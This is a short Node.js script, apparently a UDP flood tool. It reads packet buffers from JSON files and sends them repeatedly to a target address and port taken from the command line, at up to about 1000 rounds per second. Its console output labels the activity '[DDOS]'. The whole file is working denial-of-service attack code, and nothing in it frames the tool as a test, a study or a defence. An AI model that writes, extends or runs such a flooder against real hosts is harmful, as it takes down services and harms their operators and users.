const dgram = require('dgram');
const { fstat } = require('fs');
const client = dgram.createSocket('udp4');

const fs = require('fs');
const path = require('path');

const args = process.argv;

const address = args[2]
const port = args[3]

const times = args[4] ?? 1000

const buffersPath = path.join(__dirname, 'buffers');
let buffers = [];

fs.readdirSync(buffersPath).forEach((file) => {
  buffers.push(
    Buffer.from(JSON.parse(fs.readFileSync(path.join(buffersPath, file)))['buffer'])
  )
})

if (!address || !port)
  return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')

client.on('error', (e) => {
  console.log('[ERROR]: ' + e)
  process.kill(process.pid);
})

setInterval(() => {
  buffers.forEach((buffer) => {
    client.send(buffer ?? '', port, address);
  })

  console.log(`[DDOS] Sending packets to ${address}:${port}...`)
}, (1000 / (times <= 0 ? 1000 : times)))

